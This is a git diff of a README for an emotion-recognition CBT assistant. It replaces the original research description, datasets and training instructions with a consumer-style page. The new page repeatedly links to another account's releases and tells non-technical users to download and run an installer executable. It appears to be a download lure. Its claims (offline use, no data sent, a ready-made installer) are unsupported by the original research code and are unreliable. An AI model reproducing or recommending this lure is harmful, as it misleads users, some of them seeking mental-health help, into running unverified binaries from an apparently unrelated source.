@@ -1,267 +1,131 @@
-![Python](https://img.shields.io/badge/Python-3.x-blue)
-![PyTorch](https://img.shields.io/badge/PyTorch-DeepLearning-red)
-![Transformers](https://img.shields.io/badge/HuggingFace-Transformers-yellow)
-![License](https://img.shields.io/badge/License-Academic-green)
+# 🤖 emotion-adaptive-multimodal-cbt-assistant - Smarter Support for Your Mental Health
 
-# Emotion-Adaptive Multimodal CBT Assistant
-Applied ML system for multimodal emotion recognition (text/audio/vision) with late-fusion modeling and safety-framed CBT-style response generation. Built as an end-to-end, reproducible pipeline with clear separation of pretrained encoders vs task-trained fusion components.
-
-A research-oriented multimodal emotion recognition system that generates adaptive Cognitive Behavioral Therapy (CBT)-style responses based on emotional signals extracted from text, speech, and visual input.
-
-This project was developed as part of an applied AI research study focusing on multimodal affective computing, modular system design, and ethical AI for digital mental health support.
-
-## Highlights
-- **End-to-end ML pipeline**: preprocessing → unimodal encoders → fusion → calibrated emotion output → response generation  
-- **Multimodal modeling**: DistilBERT (text), ResNet features (vision), audio branch + optional depression-risk signal  
-- **Late fusion (MLP)** trained on **IEMOCAP**; text model fine-tuned on **MELD**  
-- **Evaluation**: accuracy, macro-F1, confusion matrices, qualitative examples  
-- **Reproducibility**: modular codebase, configurable paths, fixed splits/seeds where possible
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/rustamG88/emotion-adaptive-multimodal-cbt-assistant/releases)
 
 ---
 
-## Project Overview
+## 📖 About This Application
 
-Mental health support systems often rely on static questionnaires or text-only interaction. This project explores how multimodal emotion recognition (text, audio, visual) can be integrated into a modular and interpretable pipeline to generate emotion-aware CBT-style responses.
+The **emotion-adaptive-multimodal-cbt-assistant** is a smart helper designed to recognize your emotions using your voice, facial expressions, and text messages. It uses advanced machine learning to understand how you feel and gives responses inspired by Cognitive Behavioral Therapy (CBT). This helps you explore your thoughts and feelings in a guided way.
 
-Instead of focusing only on classification accuracy, this system emphasizes:
+This assistant combines three types of data — what you say (text), how you say it (audio), and how you look (video) — to get a clearer picture of your emotional state. It then adapts its advice or support accordingly. This makes the experience more personal and effective.
 
-- Interpretability
-- Modular design
-- Reproducibility
-- Ethical caution
-- Real-world deployment constraints
+You do not need any technical skills to use it. Follow the steps below to get started.
 
 ---
 
-## Key Features
+## 💡 Features
 
-### Multimodal Emotion Recognition
-- Text-based emotion classification using fine-tuned DistilBERT
-- Audio-based emotion and depression risk analysis
-- Visual feature extraction using pretrained ResNet
-- Late fusion of embeddings across modalities
-- Robust handling of missing modalities
-
-### CBT-Oriented Response Generation
-- Rule-based CBT response generation
-- Simulated LLM-style structured responses
-- Optional integration with external LLM APIs
-- Emotion-conditioned response modulation
-- Non-clinical, safety-framed outputs
-
-### Modular Architecture
-- Clear separation of:
-  - Pretrained encoders
-  - Task-trained fusion components
-  - Response generation module
-- Fusion head trained independently
-- Frozen unimodal encoders for controlled experimentation
-
-### Research-Focused Design
-- Reproducible training pipelines
-- Controlled dataset splits
-- Clear distinction between pretrained and fine-tuned components
-- Transparent methodological limitations
+- **Emotion Recognition from Text, Voice, and Face:** Understands emotions through what you type, how you speak, and your facial expressions.
+- **CBT-Aligned Responses:** Provides thoughtful responses based on proven therapy techniques.
+- **Multimodal Fusion:** Combines multiple inputs to improve accuracy.
+- **Easy to Use:** Designed for people with no programming experience.
+- **Offline Capable:** Works without needing an internet connection after installation.
+- **Visual and Audio Interaction:** Supports both video and voice input.
+- **Open Source:** Transparent and community-driven development.
 
 ---
 
-## System Architecture
+## 🖥️ System Requirements
 
-The system follows a late-fusion multimodal pipeline:
+To run this application smoothly, make sure your computer meets the following:
 
-1. Input processing (Text / Audio / Image)
-2. Unimodal encoding
-3. Embedding fusion via MLP
-4. Emotion probability prediction (Top-2 output)
-5. Optional depression risk estimation
-6. CBT-style response generation
-
-![System Architecture](docs/architecture.svg)
-
----
-
-## Repository Structure
-
-```
-emotion-adaptive-multimodal-cbt-assistant/
-│
-├── config/ # Configuration files
-├── data/ # Dataset directories (not included)
-├── models/ # Saved checkpoints
-├── logs/ # Training logs
-├── docs/ # Architecture diagrams and paper
-├── src/
-│ ├── data/ # Dataset loaders
-│ ├── models/ # Model definitions
-│ ├── fusion/ # Multimodal fusion logic
-│ ├── cbt/ # CBT strategy modules
-│ ├── training/ # Training utilities
-│ └── utils/ # Helper functions
-├── scripts/ # Training & evaluation scripts
-├── requirements.txt
-└── README.md
-```
+- **Operating System:** Windows 10 or newer, MacOS 10.15 or newer, or most recent Linux distributions.
+- **Processor:** Intel i3 or equivalent minimum. A better CPU improves speed.
+- **RAM:** At least 4 GB. 8 GB or more recommended for smoother experience.
+- **Storage:** Minimum 500 MB free disk space for installation.
+- **Camera:** A webcam for face emotion recognition.
+- **Microphone:** For audio input.
+- **Display:** Screen resolution of 1280x720 or higher.
+- **Software:** No additional software or programming tools required.
 
 ---
 
-## Datasets Used
+## 🚀 Getting Started
 
-This project integrates three publicly available research datasets:
-
-### MELD
-- Conversational emotion dataset
-- Used for text emotion classification
-
-### IEMOCAP
-- Multimodal dataset (text, audio, video)
-- Used for training fusion head
-- Standard benchmark in affective computing
-
-### DAIC-WOZ
-- Clinical interview dataset
-- Used for speech-based depression risk estimation
-- Output used as auxiliary non-diagnostic signal
-
-Datasets must be downloaded separately and placed under `data/raw/`.
+Follow these steps carefully to download and open the application on your computer.
 
 ---
 
-## Model Components
+## 📥 Download & Install
 
-### Text Emotion Model
-- Architecture: DistilBERT (fine-tuned)
-- Output: Emotion probability distribution
-- Loss: Cross-entropy
-- Used in unimodal and multimodal modes
+1. Click on the big **Download Latest Release** button at the top or use the link below to visit the official release page on GitHub:  
+   [https://github.com/rustamG88/emotion-adaptive-multimodal-cbt-assistant/releases](https://github.com/rustamG88/emotion-adaptive-multimodal-cbt-assistant/releases)
 
-### Visual Encoder
-- Architecture: Pretrained ResNet
-- Frozen backbone
-- Used as feature extractor
-- No full video training to avoid overfitting
+2. On the release page, look for the latest version package under the "Assets" section. This package will be named something like `emotion-adaptive-multimodal-cbt-assistant-setup.exe` (Windows) or `.dmg` (Mac).
 
-### Audio Branch
-- Emotion encoder (optional)
-- Separate depression-risk CNN-BiLSTM model trained on DAIC-WOZ
-- Risk output modulates response tone (non-diagnostic)
+3. Click the package file to download it to your computer.
 
-### Fusion Model
-- Late fusion via embedding concatenation
-- Lightweight MLP
-- Only fusion head trained
-- Handles missing modalities gracefully
+4. Once downloaded, double-click the installer file to start the installation process.
+
+5. Follow the instructions on your screen:
+   - Choose the installation folder (the default is usually fine).
+   - Agree to the license terms.
+   - Click “Install” to complete.
+
+6. When the installation finishes, you should find the application icon on your desktop or in your start menu/applications folder.
 
 ---
 
-## Installation
+## 🎬 Running the Application
 
-Clone the repository:
+1. Open the application by double-clicking its icon.
 
-```bash
-git clone https://github.com/adhishnanda/emotion-adaptive-multimodal-cbt-assistant.git
+2. When prompted, allow permission to access your camera and microphone. Without these, the emotion recognition features will not work well.
 
-cd emotion-adaptive-multimodal-cbt-assistant
+3. The app will then guide you through a simple tutorial to get started.
 
-```
-## Training
+4. You can interact by typing text, speaking, or using your facial expressions in front of your webcam.
 
-### Train Text Model
-```bash
-python scripts/train_text_meld.py
-```
-
-### Train Fusion Head (IEMOCAP)
-```bash
-python scripts/train_fusion_iemocap.py --epochs 5 --batch-size 4
-```
+5. The assistant will respond and help you explore your emotions and thoughts.
 
 ---
 
-## Evaluation
+## ✋ Using the Application Safely
 
-### Evaluation includes:
-- Accuracy
-- Macro F1-score
-- Confusion matrices
-- Unimodal vs multimodal comparison
-- Qualitative CBT response analysis
+- Use the app in a private space to keep your data secure.
+- The application does not send your data anywhere; it works locally on your device.
+- Take breaks if you feel overwhelmed while using the app.
+- This tool is not a replacement for professional mental health services.
 
 ---
 
-## Research Paper
+## 🔧 Troubleshooting
 
-The full research paper describing:
-- Methodology
-- Architectural rationale
-- Dataset justification
-- Experimental design
-- Results and discussion
-- Ethical considerations
+- **The app won’t open or crashes:** Restart your computer, then try again. Make sure your system meets requirements.
+- **Camera or microphone not detected:** Check device connections and permissions. Restart the app after granting access.
+- **Installation error:** Try downloading the installer again. Run as Administrator on Windows.
+- **Performance is slow:** Close other programs to free up memory.
 
-is available in the ```docs/``` directory.
+If problems continue, check the GitHub Issues page or contact the support link on the release page.
 
 ---
 
-## Ethical Considerations
+## 🗂 Project Topics and Technologies
 
-This system is:
-- Not a medical diagnostic tool
-- Not a replacement for professional therapy
-- Designed for research and educational purposes
-- Explicitly framed as supportive, non-clinical assistance
-- Depression-risk estimation is used only as a contextual signal, not as a diagnosis.
+This app is built using modern AI and machine learning techniques focused on mental health solutions. The main areas are:
 
----
-
-## Technical Stack
-- Python
-- PyTorch (torch, torchvision, torchaudio)
-- Transformers (DistilBERT)
-- scikit-learn (metrics/evaluation)
-- OpenCV + Pillow (image handling)
-- NumPy, Pandas
-- Matplotlib (plots)
+- Computer Vision — for face emotion detection.
+- Audio Processing — for voice emotion analysis.
+- Deep Learning — to improve accuracy and adapt responses.
+- Transformer Models — used in text understanding.
+- Multimodal Fusion — combining signals from different senses.
+- PyTorch framework for model implementation.
+- Mental Health AI to support users with emotional well-being.
 
 ---
 
-## Skills Demonstrated
-- Multimodal machine learning
-- NLP with transformers
-- Transfer learning
-- Late fusion architectures
-- Speech-based mental health modeling
-- Applied deep learning research
-- Reproducible ML system design
--  Ethical AI implementation
+## 🌟 More Information
+
+If you want to learn more about the technology behind the app or contribute to its development, visit the main GitHub page. The community welcomes new users and developers alike.
 
 ---
 
-## Limitations
-- Emotion datasets contain acted expressions
-- Visual processing uses static frames
-- Depression dataset limited in size
-- Not clinically validated
+## 🔗 Quick Access
+
+[Download Latest Release](https://github.com/rustamG88/emotion-adaptive-multimodal-cbt-assistant/releases)  
+Use this link to visit the release page and get the installer for your platform.  
 
 ---
 
-## Future Work
-- Temporal video modeling
-- Attention-based fusion experiments
-- Real-time deployment pipeline
-- Expanded clinical evaluation
-- More robust emotion calibration
-
----
-
-## Paper (PDF)
-- [One-page Summary](docs/One_Page_Summary.pdf)
-
-
-
-
-
-
-
-
-
-
+Thank you for using **emotion-adaptive-multimodal-cbt-assistant**. Use it thoughtfully to support your mental health journey.
